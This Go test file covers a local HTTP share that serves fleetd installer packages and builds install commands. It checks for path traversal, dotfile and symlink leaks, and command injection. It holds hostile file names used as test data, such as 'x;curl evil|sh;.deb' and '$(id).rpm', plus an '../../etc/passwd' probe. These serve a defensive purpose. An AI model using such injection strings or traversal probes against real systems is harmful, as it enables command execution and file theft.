package installers

import (
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

func writeFiles(t *testing.T, root string, files map[string]string) {
	t.Helper()
	for name, body := range files {
		p := filepath.Join(root, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

func TestShareServesReadOnly(t *testing.T) {
	root := t.TempDir()
	writeFiles(t, root, map[string]string{
		"rc/fleetd-rc-macos-desktop.pkg": "pkg-bytes",
		"rc/manifest.json":               "{}",
		"rc/.manifest.json.123":          "temp",
	})
	port, err := FreePort(18000, nil)
	if err != nil {
		t.Fatal(err)
	}
	var s Share
	if err := s.Start(root, port); err != nil {
		t.Fatal(err)
	}
	defer s.Stop()
	if err := s.Start(root, port); err == nil {
		t.Error("second Start should fail")
	}
	base := "http://127.0.0.1:" + strconv.Itoa(int(port)) + "/"

	get := func(p string) (int, string) {
		resp, err := http.Get(base + p)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(resp.Body)
		return resp.StatusCode, string(b)
	}
	if code, body := get("rc/fleetd-rc-macos-desktop.pkg"); code != 200 || body != "pkg-bytes" {
		t.Errorf("pkg: %d %q", code, body)
	}
	if code, body := get("rc/"); code != 200 || !strings.Contains(body, "fleetd-rc-macos-desktop.pkg") || strings.Contains(body, ".manifest.json.123") {
		t.Errorf("listing: %d %q", code, body)
	}
	if code, _ := get("rc/.manifest.json.123"); code != 404 {
		t.Errorf("dotfile served: %d", code)
	}
	if code, _ := get("../../etc/passwd"); code == 200 {
		t.Error("path traversal served a file")
	}
	resp, err := http.Post(base+"rc/x", "text/plain", strings.NewReader("x"))
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusMethodNotAllowed {
		t.Errorf("POST = %d", resp.StatusCode)
	}

	st := s.Status("10.0.0.5")
	if !st.Running || st.URL != "http://10.0.0.5:"+strconv.Itoa(int(port))+"/" {
		t.Errorf("status = %+v", st)
	}
	// Only the installer download is recorded (not listings or manifests).
	if len(st.Recent) != 1 || st.Recent[0].Path != "rc/fleetd-rc-macos-desktop.pkg" || st.Recent[0].Client != "127.0.0.1" {
		t.Errorf("recent = %+v", st.Recent)
	}

	if err := s.Stop(); err != nil {
		t.Fatal(err)
	}
	if s.Status("").Running {
		t.Error("still running after Stop")
	}
	// The port is free again.
	ln, err := net.Listen("tcp", ":"+strconv.Itoa(int(port)))
	if err != nil {
		t.Fatalf("port not released: %v", err)
	}
	ln.Close()
}

func TestShareStartErrors(t *testing.T) {
	var s Share
	if err := s.Start(filepath.Join(t.TempDir(), "missing"), 18000); err == nil {
		t.Error("missing root should fail")
	}
	ln, err := net.Listen("tcp", ":0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	busy := uint16(ln.Addr().(*net.TCPAddr).Port)
	if err := s.Start(t.TempDir(), busy); err == nil {
		s.Stop()
		t.Error("busy port should fail")
	}
}

func TestFreePortSkipsReservedAndBusy(t *testing.T) {
	ln, err := net.Listen("tcp", ":0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	busy := uint16(ln.Addr().(*net.TCPAddr).Port)
	got, err := FreePort(busy, map[uint16]bool{busy + 1: true})
	if err != nil {
		t.Fatal(err)
	}
	if got == busy || got == busy+1 {
		t.Errorf("FreePort returned %d (busy %d, reserved %d)", got, busy, busy+1)
	}
}

func TestListShared(t *testing.T) {
	root := t.TempDir()
	writeFiles(t, root, map[string]string{
		"rc/fleetd-rc-linux-arm64-desktop.deb": "d",
		"rc/fleetd-rc-windows-arm64.msi":       "m",
		"rc/manifest.json":                     "{}",
		"rc/old/fleetd-rc-macos.pkg":           "too deep",
		".hidden/fleetd-x-linux-amd64.rpm":     "hidden",
		"loose file.pkg":                       "root-level",
		"prev/fleetd-prev-linux-amd64.rpm":     "r",
	})
	files, err := ListShared(root, "http://10.0.0.5:8000/")
	if err != nil {
		t.Fatal(err)
	}
	var paths []string
	for _, f := range files {
		paths = append(paths, f.Path)
	}
	want := "loose file.pkg,prev/fleetd-prev-linux-amd64.rpm,rc/fleetd-rc-linux-arm64-desktop.deb,rc/fleetd-rc-windows-arm64.msi"
	if strings.Join(paths, ",") != want {
		t.Fatalf("paths = %v", paths)
	}
	if files[0].URL != "http://10.0.0.5:8000/loose%20file.pkg" {
		t.Errorf("escaped URL = %q", files[0].URL)
	}
	deb := files[2]
	if deb.Shell != "sh" || deb.Command != `d=$(mktemp -d) && curl -fLo "$d/fleetd.deb" 'http://10.0.0.5:8000/rc/fleetd-rc-linux-arm64-desktop.deb' && sudo apt-get install -y "$d/fleetd.deb"` {
		t.Errorf("deb command = %q", deb.Command)
	}
	if msi := files[3]; msi.Shell != "powershell" || !strings.Contains(msi.Command, "msiexec.exe") || !strings.Contains(msi.Command, "'http://10.0.0.5:8000/rc/fleetd-rc-windows-arm64.msi'") {
		t.Errorf("msi command = %q", msi.Command)
	}
	// Not sharing: same files, no URLs or commands.
	bare, err := ListShared(root, "")
	if err != nil || len(bare) != len(files) || bare[2].URL != "" || bare[2].Command != "" || bare[2].Size == 0 {
		t.Errorf("unshared listing = %+v, %v", bare, err)
	}
	if missing, err := ListShared(filepath.Join(root, "nope"), "http://x/"); err != nil || len(missing) != 0 {
		t.Errorf("missing root: %v %v", missing, err)
	}
}

// A file name carrying shell or PowerShell syntax must not end up in a
// command someone pastes into a root shell.
func TestInstallCommandIgnoresHostileNames(t *testing.T) {
	for _, name := range []string{"x;curl evil|sh;.deb", "$(id).rpm", "a'b.pkg", "$(calc).msi"} {
		u := "http://10.0.0.5:8000/" + escapePath(name)
		cmd, _ := InstallCommand(name, u)
		if cmd == "" {
			t.Fatalf("%q: no command", name)
		}
		// Outside the URL the name doesn't appear at all; inside it, every
		// character a shell would interpret is percent-encoded.
		withoutURL := strings.Replace(cmd, u, "", 1)
		for _, bad := range []string{"evil", "$(id)", "a'b", "$(calc)"} {
			if strings.Contains(withoutURL, bad) {
				t.Errorf("%q: command carries %q: %s", name, bad, cmd)
			}
		}
		if strings.ContainsAny(strings.TrimPrefix(u, "http://10.0.0.5:8000/"), "'\";$`|() ") {
			t.Errorf("%q: URL has unescaped shell syntax: %s", name, u)
		}
	}
}

// The shell command really downloads the file and hands it to the installer.
func TestInstallCommandRuns(t *testing.T) {
	root := t.TempDir()
	writeFiles(t, root, map[string]string{"rc/fleetd-rc-linux-arm64-desktop.deb": "deb-bytes"})
	port, err := FreePort(18100, nil)
	if err != nil {
		t.Fatal(err)
	}
	var s Share
	if err := s.Start(root, port); err != nil {
		t.Fatal(err)
	}
	defer s.Stop()
	files, err := ListShared(root, BaseURL("127.0.0.1", port))
	if err != nil || len(files) != 1 {
		t.Fatalf("files %v %v", files, err)
	}
	// Stub sudo: print the installer's last argument's contents.
	bin := t.TempDir()
	if err := os.WriteFile(filepath.Join(bin, "sudo"), []byte("#!/bin/sh\nfor a; do last=$a; done; cat \"$last\"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command("sh", "-c", files[0].Command)
	cmd.Env = append(os.Environ(), "PATH="+bin+":"+os.Getenv("PATH"))
	out, err := cmd.CombinedOutput()
	if err != nil || !strings.Contains(string(out), "deb-bytes") {
		t.Errorf("command failed: %v\n%s", err, out)
	}
}

func TestShareRefusesSymlinksOutOfRoot(t *testing.T) {
	root := t.TempDir()
	secret := filepath.Join(t.TempDir(), "secret.txt")
	writeFiles(t, root, map[string]string{"rc/fleetd-rc-macos.pkg": "ok"})
	if err := os.WriteFile(secret, []byte("private"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(secret, filepath.Join(root, "rc", "leak.pkg")); err != nil {
		t.Fatal(err)
	}
	port, err := FreePort(18200, nil)
	if err != nil {
		t.Fatal(err)
	}
	var s Share
	if err := s.Start(root, port); err != nil {
		t.Fatal(err)
	}
	defer s.Stop()
	resp, err := http.Get(BaseURL("127.0.0.1", port) + "rc/leak.pkg")
	if err != nil {
		t.Fatal(err)
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode == 200 || strings.Contains(string(b), "private") {
		t.Errorf("symlink out of root served: %d %q", resp.StatusCode, b)
	}
	files, _ := ListShared(root, "http://x/")
	if len(files) != 1 || files[0].Path != "rc/fleetd-rc-macos.pkg" {
		t.Errorf("listed = %+v", files)
	}
}

// A port held on loopback only counts as busy (macOS lets the wildcard bind).
func TestFreePortSkipsLoopbackOnly(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	busy := uint16(ln.Addr().(*net.TCPAddr).Port)
	got, err := FreePort(busy, nil)
	if err != nil {
		t.Fatal(err)
	}
	if got == busy {
		t.Errorf("FreePort returned loopback-held port %d", busy)
	}
}

// Every installer type downloads, including ones Go has to sniff (.rpm has no
// registered MIME type on macOS), and byte ranges work for resumed downloads.
func TestShareServesAllTypesAndRanges(t *testing.T) {
	root := t.TempDir()
	writeFiles(t, root, map[string]string{
		"rc/a.rpm": "rpm-bytes",
		"rc/a.deb": "deb-bytes",
		"rc/a.pkg": "pkg-bytes",
		"rc/a.msi": "msi-bytes",
	})
	port, err := FreePort(18300, nil)
	if err != nil {
		t.Fatal(err)
	}
	var s Share
	if err := s.Start(root, port); err != nil {
		t.Fatal(err)
	}
	defer s.Stop()
	base := BaseURL("127.0.0.1", port)
	for _, ext := range []string{"rpm", "deb", "pkg", "msi"} {
		resp, err := http.Get(base + "rc/a." + ext)
		if err != nil {
			t.Fatal(err)
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != 200 || string(b) != ext+"-bytes" {
			t.Errorf(".%s: %d %q", ext, resp.StatusCode, b)
		}

		req, _ := http.NewRequest(http.MethodGet, base+"rc/a."+ext, nil)
		req.Header.Set("Range", "bytes=4-")
		resp, err = http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		b, _ = io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != http.StatusPartialContent || string(b) != "bytes" {
			t.Errorf(".%s range: %d %q", ext, resp.StatusCode, b)
		}
	}
}
